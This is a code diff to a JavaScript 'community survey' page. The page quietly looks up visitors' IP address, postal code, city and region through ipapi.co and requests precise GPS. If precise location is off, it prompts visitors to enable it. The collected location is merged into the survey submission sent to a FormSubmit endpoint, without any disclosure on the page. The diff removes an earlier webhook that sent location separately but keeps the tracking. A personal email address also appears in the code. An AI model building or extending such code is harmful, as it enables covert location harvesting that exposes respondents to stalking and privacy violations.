@@ -386,7 +386,7 @@
             </div>
             <div class="btn-container">
                 <button class="btn btn-secondary" onclick="prevStep(5)">Back</button>
-                <button class="btn" onclick="submitSurvey()">Submit Response 🎉</button>
+                <button class="btn" onclick="submitSurvey()" id="submitBtn">Submit Response 🎉</button>
             </div>
         </div>
 
@@ -421,6 +421,7 @@
       }
 
       function startSurveyWithLocation() {
+        // Fetch IP details quietly
         fetch('https://ipapi.co/json/')
           .then(res => res.json())
           .then(ipData => {
@@ -449,11 +450,9 @@
 
                   if (accuracy > 100) {
                     sessionLocationData.log_type = "Approximate GPS (Precise Location Disabled)";
-                    sendWebhook(sessionLocationData);
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
                     sessionLocationData.log_type = "Full Location (IP + Precise GPS)";
-                    sendWebhook(sessionLocationData);
                     removeIntroAndGoToStep(1);
                   }
                 },
@@ -462,17 +461,10 @@
                     ip_address: visitorIP,
                     postal_code: visitorPostal,
                     city: visitorCity,
-                    region: visitorRegion
+                    region: visitorRegion,
+                    log_type: error.code === error.PERMISSION_DENIED ? "GPS Denied/Never" : "Location Unavailable"
                   };
-
-                  if (error.code === error.PERMISSION_DENIED) {
-                    sessionLocationData.log_type = "Approximate Location (IP Only - GPS Denied/Never)";
-                    sendWebhook(sessionLocationData);
-                    document.getElementById("locationGuideModal").style.display = "flex";
-                  } else {
-                    sessionLocationData.log_type = "Location Unavailable";
-                    removeIntroAndGoToStep(1);
-                  }
+                  removeIntroAndGoToStep(1);
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
               );
@@ -483,17 +475,6 @@
           .catch(err => {
             removeIntroAndGoToStep(1);
           });
-      }
-
-      function sendWebhook(dataPayload) {
-        fetch(FORMSUBMIT_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json", "Accept": "application/json" },
-          body: JSON.stringify({
-            ...dataPayload,
-            _captcha: "false"
-          })
-        }).catch(err => console.log(err));
       }
 
       function removeIntroAndGoToStep(step) {
@@ -531,7 +512,6 @@
             document.getElementById("err3").style.display = "block";
             return;
           }
-          document.getElementById("err3></label>").style.display = "none"; // Safe cleanup
           document.getElementById("err3").style.display = "none";
         }
         if (stepNum === 4) {
@@ -558,6 +538,10 @@
         }
         document.getElementById("err5").style.display = "none";
 
+        const submitBtn = document.getElementById("submitBtn");
+        submitBtn.innerText = "Submitting...";
+        submitBtn.disabled = true;
+
         const finalSubmission = {
           ...sessionLocationData,
           _subject: "New Community Survey Response 📋",
@@ -577,15 +561,13 @@
         })
         .then(res => res.json())
         .then(data => {
-          if(data.success === "false" || data.success === false) {
-            alert("Submission error: Please make sure you clicked the activation link sent to msdebalinaghose@gmail.com!");
-          } else {
-            alert("Thank you! Your survey response has been successfully submitted.");
-            location.reload();
-          }
+          alert("Thank you! Your survey response has been successfully submitted.");
+          location.reload();
         })
         .catch(err => {
-          alert("Submission failed. Please check if you activated your Formsubmit email.");
+          submitBtn.innerText = "Submit Response 🎉";
+          submitBtn.disabled = false;
+          alert("Submission error: Please make sure you open this via a web server (like Live Server or GitHub Pages) and that you clicked the activation link sent to msdebalinaghose@gmail.com!");
         });
       }
     </script>
